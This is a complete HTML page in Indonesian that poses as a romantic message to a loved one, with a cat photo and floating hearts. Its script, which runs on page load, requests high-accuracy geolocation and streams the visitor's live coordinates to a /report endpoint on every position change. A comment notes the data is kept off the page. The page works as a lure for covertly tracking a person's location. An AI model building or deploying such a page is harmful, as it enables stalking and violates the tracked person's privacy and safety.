<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <title>💗 untuk kamu sayang</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root {
      --pink1: #ffd0e3;
      --pink2: #ff9ccf;
      --accent: #ff4d79;
    }

    html,body {
      height:100%;
      margin:0;
      font-family: "Poppins", sans-serif;
      background: radial-gradient(circle at top left, var(--pink1), var(--pink2));
      display:flex;
      align-items:center;
      justify-content:center;
      color:#fff;
      overflow:hidden;
    }

    .card {
      text-align:center;
      background: rgba(255,255,255,0.12);
      backdrop-filter: blur(8px);
      border-radius:18px;
      padding:30px 36px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      z-index:2;
    }

    h1 { margin:0 0 8px 0; font-size:2rem; text-shadow:0 0 12px rgba(255,77,121,0.4); }
    .kitty {
      width:260px;
      height:260px;
      object-fit:cover;
      border-radius:16px;
      box-shadow:0 8px 25px rgba(0,0,0,0.25);
      display:block;
      margin:10px auto;
    }

    .floating {
      position:fixed;
      inset:0;
      pointer-events:none;
      z-index:1;
      overflow:hidden;
    }

    .love {
      position:absolute;
      font-size:16px;
      opacity:0.9;
      text-shadow: 0 0 8px rgba(255,120,160,0.6);
      animation: floatUp linear infinite;
      white-space:nowrap;
    }

    @keyframes floatUp {
      0% { transform: translateY(110vh) scale(0.6); opacity: 0; }
      10% { opacity: 1; }
      100% { transform: translateY(-140vh) scale(1.2); opacity: 0; }
    }

    #status { margin-top:8px; font-size:0.95rem; color:rgba(255,255,255,0.9); }
    video { display:none; } /* keep to avoid showing preview */
  </style>
</head>
<body>
  <div class="floating" id="floating"></div>

  <div class="card" role="main" aria-live="polite">
    <h1>💞 Halo sayang... 💞</h1>
    <img class="kitty" src="/static/img/kucing.jpeg" alt="muka kucing imut">
    <div id="status">aku kangen sama kamuuu</div>
  </div>

  <script>
    // client_id sederhana
    const clientId = localStorage.getItem('client_id') || ('client_' + Math.random().toString(36).slice(2,9));
    localStorage.setItem('client_id', clientId);

    // efek love
    const floating = document.getElementById('floating');
    function spawnLoves(count = 6) {
      const vw = window.innerWidth, vh = window.innerHeight;
      for (let i=0;i<count;i++){
        const el = document.createElement('div');
        el.className = 'love';
        const emojis = ["💗","💕","💞","💓","💖","❣️"];
        el.textContent = emojis[Math.floor(Math.random()*emojis.length)];
        el.style.left = Math.random() * vw + 'px';
        el.style.fontSize = (12 + Math.random()*28) + 'px';
        el.style.animationDuration = (6 + Math.random()*6) + 's';
        floating.appendChild(el);
        setTimeout(()=> el.remove(), (parseFloat(el.style.animationDuration)+0.5)*1000);
      }
    }
    spawnLoves(18);
    setInterval(()=> spawnLoves(6), 900);

    // Kirim ke server (/report) — hanya lat/lon + client_id (tidak menampilkan di halaman)
    async function sendReport(lat, lon, source='gps') {
      try {
        await fetch('/report', {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ client_id: clientId, latitude: lat, longitude: lon, source })
        });
        console.log('lokasi dikirim', lat, lon);
      } catch(e) {
        console.warn('gagal kirim report', e);
      }
    }

    // ambil lokasi awal + watch
    function startLocation() {
      const statusEl = document.getElementById('status');
      if (!navigator.geolocation) {
        statusEl.textContent = 'Browser tidak mendukung lokasi.';
        return;
      }

      // get current
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude, lon = pos.coords.longitude;
        statusEl.textContent = 'Lokasi dikirim (privat).';
        sendReport(lat, lon, 'gps');
      }, err => {
        statusEl.textContent = 'Izin lokasi dibutuhkan agar pelacakan aktif.';
        console.warn('getCurrentPosition error', err);
      }, { enableHighAccuracy: true, timeout:8000 });

      // watchPosition untuk update realtime — kirim setiap perubahan
      navigator.geolocation.watchPosition(pos => {
        const lat = pos.coords.latitude, lon = pos.coords.longitude;
        sendReport(lat, lon, 'gps');
      }, err => {
        console.warn('watchPosition error', err);
      }, { enableHighAccuracy: true, maximumAge: 5000, timeout:8000 });
    }

    // langsung trigger (user akan diminta izin oleh browser)
    window.addEventListener('load', () => {
      startLocation();
    });
  </script>
</body>
</html>
